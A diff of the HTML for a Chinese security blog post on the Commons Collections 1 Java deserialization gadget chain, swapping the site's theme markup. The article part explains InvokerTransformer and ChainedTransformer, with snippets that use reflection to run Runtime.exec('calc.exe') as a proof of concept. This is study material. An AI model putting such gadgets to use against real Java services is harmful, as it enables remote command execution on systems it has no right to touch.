@@ -1,358 +1,146 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
-
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/douni.jpg">
-  <link rel="icon" href="/img/douni.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="fault_li">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="TransformedMap这是除yso中的LazyMap之外的另一种TransformedMap的链子环境配置就不说了，网上太多教程了(实话说这环境配好好久了，每次调一半就开摆，这次一定一定不能摆了)我们先从Transformer这个接口看起，来查找它的实现类 我们在直奔主题前看到这个东西 ChainedTransformer这个代码我们瞅一眼它的transform方法它的功能很显而易见就是实现">
-<meta property="og:type" content="article">
-<meta property="og:title" content="commonscollections-1">
-<meta property="og:url" content="http://example.com/2024/03/21/commonscollections-1/index.html">
-<meta property="og:site_name" content="fault&#96;s blog">
-<meta property="og:description" content="TransformedMap这是除yso中的LazyMap之外的另一种TransformedMap的链子环境配置就不说了，网上太多教程了(实话说这环境配好好久了，每次调一半就开摆，这次一定一定不能摆了)我们先从Transformer这个接口看起，来查找它的实现类 我们在直奔主题前看到这个东西 ChainedTransformer这个代码我们瞅一眼它的transform方法它的功能很显而易见就是实现">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212413.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212729.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204213039.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220359.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220725.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221550.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204221846.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222100.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204222705.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224004.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224101.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204224618.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225433.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204225621.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231551.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204231857.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232547.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204232652.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204233752.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234017.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234256.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234318.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234437.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234506.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234553.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204234710.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235207.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235306.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204235351.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205155346.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160201.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160531.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160712.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205160902.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161052.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161627.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205161920.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162305.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205162805.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163621.png">
-<meta property="og:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205163709.png">
-<meta property="article:published_time" content="2024-03-21T05:06:50.647Z">
-<meta property="article:modified_time" content="2024-03-21T05:03:18.520Z">
-<meta property="article:author" content="fault_li">
-<meta property="article:tag" content="Java">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212413.png">
-  
-  
-  
-  <title>commonscollections-1 - fault`s blog</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
-  
-
-
-
-  
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
-<meta name="generator" content="Hexo 7.2.0"></head>
-
-
-<body>
-  
-
-  <header>
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>commonscollections-1 | fault`s blog</title><noscript>开启JavaScript才能访问本站哦~</noscript><link rel="icon" href="/img/bitbug_favicon.ico"><!-- index.css--><link rel="stylesheet" href="/css/index.css?v=2.0.4"><!-- inject head--><link rel="canonical" href="http://example.com/2024/03/21/commonscollections-1/"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css"><!-- aplayer--><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.css"><!-- swiper--><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.css"><!-- fancybox ui--><!-- katex--><!-- Open Graph--><meta name="description" content="TransformedMap这是除yso中的LazyMap之外的另一种TransformedMap的链子环境配置就不说了，网上太多教程了(实话说这环境配好好久了，每次调一半就开摆，这次一定一定不能摆了)我们先从Transformer这个接口看起，来查找它的实现类 我们在直奔主题前看到这个东西 Cha"><!-- pwa--><meta name="apple-mobile-web-app-capable" content="fault`s blog"><meta name="theme-color" content="var(--efu-main)"><meta name="apple-mobile-web-app-status-bar-style" content="var(--efu-main)"><link rel="bookmark" href="/img/bitbug_favicon.ico"><link rel="apple-touch-icon" href="/img/bitbug_favicon.ico" sizes="180x180"><script>console.log(' %c Solitude %c ' + '2.0.4' + ' %c https://github.com/everfu/hexo-theme-solitude',
+    'background:#35495e ; padding: 1px; border-radius: 3px 0 0 3px;  color: #fff',
+    'background:#ff9a9a ; padding: 1px; border-radius: 0 3px 3px 0;  color: #fff',
+    'background:unset ; padding: 1px; border-radius: 0 3px 3px 0;  color: #fff')
+</script><script>(()=>{
+        const saveToLocal = {
+            set: function setWithExpiry(key, value, ttl) {
+                if (ttl === 0)
+                    return
+                const now = new Date()
+                const expiryDay = ttl * 86400000
+                const item = {
+                    value: value,
+                    expiry: now.getTime() + expiryDay
+                }
+                localStorage.setItem(key, JSON.stringify(item))
+            },
+            get: function getWithExpiry(key) {
+                const itemStr = localStorage.getItem(key)
     
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>fault`s blog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/" target="_self">
-                <i class="iconfont icon-home-fill"></i>
-                <span>首页</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/" target="_self">
-                <i class="iconfont icon-archive-fill"></i>
-                <span>归档</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/" target="_self">
-                <i class="iconfont icon-category-fill"></i>
-                <span>分类</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/" target="_self">
-                <i class="iconfont icon-tags-fill"></i>
-                <span>标签</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/" target="_self">
-                <i class="iconfont icon-user-fill"></i>
-                <span>关于</span>
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/" target="_self">
-                <i class="iconfont icon-link-fill"></i>
-                <span>友链</span>
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              <i class="iconfont icon-search"></i>
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
-              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
-            </a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-  
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="commonscollections-1"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
+                if (!itemStr) {
+                    return undefined
+                }
+                const item = JSON.parse(itemStr)
+                const now = new Date()
     
+                if (now.getTime() > item.expiry) {
+                    localStorage.removeItem(key)
+                    return undefined
+                }
+                return item.value
+            }
+        };
+        window.utils = {
+            saveToLocal: saveToLocal,
+            getCSS: (url, id = false) => new Promise((resolve, reject) => {
+              const link = document.createElement('link')
+              link.rel = 'stylesheet'
+              link.href = url
+              if (id) link.id = id
+              link.onerror = reject
+              link.onload = link.onreadystatechange = function() {
+                const loadState = this.readyState
+                if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+                link.onload = link.onreadystatechange = null
+                resolve()
+              }
+              document.head.appendChild(link)
+            }),
+            getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+              const script = document.createElement('script')
+              script.src = url
+              script.async = true
+              script.onerror = reject
+              script.onload = script.onreadystatechange = function() {
+                const loadState = this.readyState
+                if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+                script.onload = script.onreadystatechange = null
+                resolve()
+              }
     
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-03-21 13:06" pubdate>
-          2024年3月21日 下午
-        </time>
-      </span>
+              Object.keys(attr).forEach(key => {
+                script.setAttribute(key, attr[key])
+              })
     
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
+              document.head.appendChild(script)
+            }),
+            addGlobalFn: (key, fn, name = false, parent = window) => {
+                const globalFn = parent.globalFn || {}
+                const keyObj = globalFn[key] || {}
         
-          2.7k 字
+                if (name && keyObj[name]) return
         
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          23 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <h1 id="seo-header">commonscollections-1</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>这是除yso中的LazyMap之外的另一种TransformedMap的链子<br>环境配置就不说了，网上太多教程了(实话说这环境配好好久了，每次调一半就开摆，这次一定一定不能摆了)<br>我们先从Transformer这个接口看起，来查找它的实现类<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212413.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+                name = name || Object.keys(keyObj).length
+                keyObj[name] = fn
+                globalFn[key] = keyObj
+                parent.globalFn = globalFn
+            },
+        }
+    })()</script><!-- global head--><script>const GLOBAL_CONFIG = {
+    root: '/',
+    algolia: undefined,
+    localsearch: undefined,
+    runtime: '2023-04-20 00:00:00',
+    lazyload: {
+        enable: true,
+        error: '/img/error_load.avif'
+    },
+    copyright: {"limit":50,"author":"作者: fault_li","link":"链接: ","source":"来源: fault`s blog","info":"著作权归作者所有。 商业转载请联系作者获得授权，非商业转载请注明出处。"},
+    highlight: {"limit":200,"expand":true,"copy":true,"syntax":"highlight.js"},
+    randomlink: false,
+    lang: {"theme":{"dark":"已切换至深色模式","light":"已切换至浅色模式"},"copy":{"success":"复制成功","error":"复制失败"},"backtop":"返回顶部","time":{"day":"天前","hour":"小时前","just":"刚刚","min":"分钟前","month":"个月前"},"day":" 天","f12":"开发者模式已打开，请遵循GPL协议。","totalk":"无需删除空行，直接输入评论即可"},
+    aside: {
+        sayhello: {
+            morning: "✨ 美好的一天开启啦",
+            noon: "吃得香才能吃得香（确信）",
+            afternoon: "是fault的午睡和游戏时间~",
+            night: "努力学习ing...",
+            goodnight: "碎觉碎觉 😴",
+        },
+        sayhello2: [],
+        sayhello3: {
+            prefix: '好久不见，',
+            back: '欢迎再次回来，',
+        },
+    },
+    covercolor: {
+        enable: false
+    },
+    comment: false,
+    lightbox: 'null',
+    post_ai: false,
+    right_menu: false,
+    lure: false,
+    expire: false,
+};</script><!-- page-config head--><script id="config-diff">var PAGE_CONFIG = {
+    is_post: true,
+    is_page: false,
+    is_home: false,
+    page: '',
+    toc: false,
+    comment: false,
+    ai_text: false
+}</script><meta name="generator" content="Hexo 7.2.0"></head><body id="body"><!-- universe--><canvas id="universe"></canvas><!-- background img--><!-- loading--><!-- console--><!-- sidebar--><div id="sidebar" style="zoom: 1;"><div id="menu-mask" style="display: none;"></div><div id="sidebar-menus"><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><span class="darkmode_switchbutton menu-child" onclick="sco.switchDarkMode()"><i class="solitude fa-solid fa-circle-half-stroke"></i><span>显示模式</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Article</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="solitude  fas fa-folder-closed"></i><span>Archives</span></a></li><li><a class="site-page child" href="/categories/"><i class="solitude  fas fa-clone"></i><span>Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="solitude  fas fa-tags"></i><span>Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Friends</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/moments/"><i class="solitude  fas fa-wifi"></i><span>Moments</span></a></li><li><a class="site-page child" href="/links/"><i class="solitude  fas fa-user-group"></i><span>Links</span></a></li><li><a class="site-page child" href="javascript:travelling()"><i class="solitude  fas fa-gift"></i><span>Treasure</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Myself</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="solitude  fas fa-laptop"></i><span>Equipment</span></a></li><li><a class="site-page child" href="/tlink/"><i class="solitude  fas fa-toolbox"></i><span>Toobox</span></a></li><li><a class="site-page child" href="/music/"><i class="solitude  fas fa-music"></i><span>Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><span>About</span></a></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-widget card-tags card-archives card-webinfo card-allinfo"><div class="card-tag-cloud"><a href="/tags/%E6%80%BB%E7%BB%93/">总结<sup>1</sup></a><a href="/tags/Java%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5/">Java各种注入<sup>1</sup></a><a href="/tags/%E5%9F%9F%E7%9B%B8%E5%85%B3/">域相关<sup>2</sup></a><a href="/tags/Java/">Java<sup>8</sup></a><a href="/tags/IOT/">IOT<sup>1</sup></a><a href="/tags/Web/">Web<sup>1</sup></a><a href="/tags/%E6%AF%94%E8%B5%9Bwp/">比赛wp<sup>1</sup></a><a href="/tags/Crypto/">Crypto<sup>2</sup></a></div></div></div></div><!-- keyboard--><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav class="show" id="nav"><div id="nav-group"><div id="blog_name"><a id="site-name" href="/" title="返回博客主页"><span class="title">fault# Solitude / fas fa-ghost / /img/pwa/favicon.ico</span><i class="solitude fa-solid fa-home"></i></a></div><div id="page-name-mask"><div id="page-name"><a id="page-name-text" onclick="sco.toTop()">commonscollections-1</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><span>Home</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Article</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="solitude  fas fa-folder-closed"></i><span>Archives</span></a></li><li><a class="site-page child" href="/categories/"><i class="solitude  fas fa-clone"></i><span>Categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="solitude  fas fa-tags"></i><span>Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Friends</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/moments/"><i class="solitude  fas fa-wifi"></i><span>Moments</span></a></li><li><a class="site-page child" href="/links/"><i class="solitude  fas fa-user-group"></i><span>Links</span></a></li><li><a class="site-page child" href="javascript:travelling()"><i class="solitude  fas fa-gift"></i><span>Treasure</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span>Myself</span></a><ul class="menus_item_child"><li><a class="site-page child" href="/equipment/"><i class="solitude  fas fa-laptop"></i><span>Equipment</span></a></li><li><a class="site-page child" href="/tlink/"><i class="solitude  fas fa-toolbox"></i><span>Toobox</span></a></li><li><a class="site-page child" href="/music/"><i class="solitude  fas fa-music"></i><span>Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><span>About</span></a></div></div></div><div id="nav-left"></div><div id="nav-right"><div class="nav-button" id="nav-totop" onclick="sco.toTop()"><a class="totopbtn"><i class="solitude fa-solid fa-arrow-up"></i><span id="percent">0</span></a></div><div id="toggle-menu"><a class="site-page"><i class="solitude fa-solid fa-bars"></i></a></div></div></div></nav><div class="coverdiv" id="coverdiv"><img class="nolazyload" id="post-cover" src="/" alt="commonscollections-1"></div><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original" title="该文章为原创文章，注意版权协议">原创</a><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java/"><span class="tags-name tags-punctuation"><i class="solitude fa-solid fa-hashtag"></i>Java</span></a></div></div></div></div><h1 class="post-title">commonscollections-1</h1><div id="post-meta"><div class="meta-secondline"></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h1><p>这是除yso中的LazyMap之外的另一种TransformedMap的链子<br>环境配置就不说了，网上太多教程了(实话说这环境配好好久了，每次调一半就开摆，这次一定一定不能摆了)<br>我们先从Transformer这个接口看起，来查找它的实现类<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212413.png" alt="image.png"></p>
 <p>我们在直奔主题前看到这个东西</p>
-<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这个代码我们瞅一眼它的transform方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212729.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>它的功能很显而易见就是实现了一个链式递归调用，将前一个的输出作为后一个的输入，gadget也是需要这样的东西来帮助自动调用链的<br>好了，我们现在直接进入主题</p>
-<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>很显然可以知道它继承了serializable，我们再去看看它的transform方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204213039.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>这个代码我们瞅一眼它的transform方法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204212729.png" alt="image.png"><br>它的功能很显而易见就是实现了一个链式递归调用，将前一个的输出作为后一个的输入，gadget也是需要这样的东西来帮助自动调用链的<br>好了，我们现在直接进入主题</p>
+<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>很显然可以知道它继承了serializable，我们再去看看它的transform方法<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204213039.png" alt="image.png"></p>
 <p>显然它在用反射来动态调用我们输入的对象和方法，这些全是我们自己可控的，这一听就是个很危险的东西，专业点说就是任意方法调用</p>
 <p>我们尝试用这个方法弹计算器（典！</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//        Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br></code></pre></td></tr></table></figure>
 
 <p>但我们刚才的目的是要试试这个方法来实现任意方法调用，那么很显然我们要用反射，我们先改写一下上面的payload</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Runtime.class;  <br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);  <br>execMethod.invoke(r,<span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure>
-<p>草，之前存的项目不能用，重新构建一次呜呜呜<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220359.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>终于可以了，感动<br>然后我们去用invokeTransformer<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220725.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>它的参数是方法名，参数类型（array，参数（array</p>
+<p>草，之前存的项目不能用，重新构建一次呜呜呜<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220359.png" alt="image.png"><br>终于可以了，感动<br>然后我们去用invokeTransformer<br><img src= "/img/loading.avif" data-lazy-src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240204220725.png" alt="image.png"><br>它的参数是方法名，参数类型（array，参数（array</p>
 <p>所以我们先直接调用<br>用这一行代码就可以解决</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;).transform(r);<br></code></pre></td></tr></table></figure>
